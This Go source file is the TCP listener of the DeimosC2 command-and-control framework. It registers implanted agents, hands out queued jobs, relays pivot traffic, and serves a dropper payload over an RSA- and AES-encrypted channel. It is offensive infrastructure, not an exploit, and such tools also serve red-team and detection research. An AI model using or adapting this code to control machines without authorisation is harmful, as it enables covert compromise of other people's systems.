package listeners

import (
	"encoding/binary"
	"net"

	"github.com/DeimosC2/DeimosC2/c2/agents"
	"github.com/DeimosC2/DeimosC2/lib/crypto"
	"github.com/DeimosC2/DeimosC2/lib/logging"
)

//JobCount is a global variable containing the number of jobs
//This is duplicative off of the actual agents, when it gets refactored then we can just import it from the agent section itself
var JobCount int

//StartTCPServer will start the new tcp server
func StartTCPServer(newListener ListOptions, pr []byte) (net.Listener, bool) {
	logging.Logger.Println("Listener Started ")

	l, err := net.Listen("tcp", ":"+newListener.Port)

	if err != nil {
		logging.ErrorLogger.Println("Cannot create socket: ", err.Error())
		return l, false
	}
	go serverRun(l, pr, newListener)
	return l, true
}

func serverRun(l net.Listener, pr []byte, newListener ListOptions) {
	for {
		conn, err := l.Accept()
		if err != nil {
			logging.ErrorLogger.Println("Cannot accept connection: ", err.Error())
			return
		}
		go handleConnection(conn, pr, newListener)
	}
}

//handleConnections handles each connection to the listener
//Gets data from the agent and then based off the msgtype will decide
//What to do with the incoming data
func handleConnection(conn net.Conn, pr []byte, newListener ListOptions) {
	defer logging.TheRecovery()

	data, msgType, agentKey, aesKey := recvMsg(conn, pr)
	externalIP, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	switch msgType {
	case "0": //consolidating 0 and 1 because its unnecesary to have them seperated.
		nName := register(data, newListener.Key, false, "", externalIP)
		sendMsg(conn, []byte(nName), aesKey)
	case "2":
		checkIn(data, agentKey, "")
		sendMsg(conn, agents.GetJobs(agentKey), aesKey)
	case "3": //this case is to be used for data that needs to be sent immediently to the server vs the typically job
		logging.Logger.Println("case 3 called")
		resp := pivotHandler([]byte(data), agentKey, externalIP)
		sendMsg(conn, []byte(resp), aesKey)
	case "6":
		ModHandler(data)
	case "7":
		conn.Write(Dropper(data, newListener.Key))
		conn.Close()
	default:
		logging.Logger.Println("How did you get here?")
		return
	}

}

//Recieves messages from the agents and returns the data and msgtype
func recvMsg(conn net.Conn, pr []byte) (string, string, string, []byte) {
	//read the first 4 bytes which are the length
	rawMsgLen := make([]byte, 8)
	_, err := conn.Read(rawMsgLen)
	if err != nil {
		logging.ErrorLogger.Println("Cannot read message: ", err.Error())
		return "", "", "", nil
	}
	message := make([]byte, 0)
	readBuffer := make([]byte, 1024)
	readLength := uint64(0)
	for {
		n, err := conn.Read(readBuffer)
		message = append(message, readBuffer[:n]...)
		readLength += uint64(n)
		if readLength == binary.BigEndian.Uint64(rawMsgLen) {
			break
		}
		if err != nil {
			logging.ErrorLogger.Println("Cannot read message: ", err.Error())
			return "", "", "", nil
		}
	}

	var msgType string
	var agentKey string
	var plaintext string

	//If connection is a dropper
	if len(message) == 39 {
		msgType = "7"
		plaintext = string(message)
		return plaintext, msgType, agentKey, nil
	}

	priv := crypto.BytesToPrivateKey(pr)
	decRSA := crypto.DecryptWithPrivateKey(message[0:256], priv)
	msgType = string(decRSA[0])
	var aesKey []byte

	agentKey = string(decRSA[1:37])
	aesKey = decRSA[37:]
	decMsg := crypto.Decrypt(message[256:], aesKey)
	plaintext = string(decMsg)

	message = nil
	return plaintext, msgType, agentKey, aesKey
}

//sendMsg takes in an array of bytes and sends it to the agent
func sendMsg(conn net.Conn, data []byte, aesKey []byte) {
	encMsg := crypto.Encrypt(data, aesKey)
	msgLen := make([]byte, 8)
	binary.BigEndian.PutUint64(msgLen, uint64(len(encMsg)))
	fullMessage := append(msgLen, encMsg...)
	conn.Write(fullMessage)
}
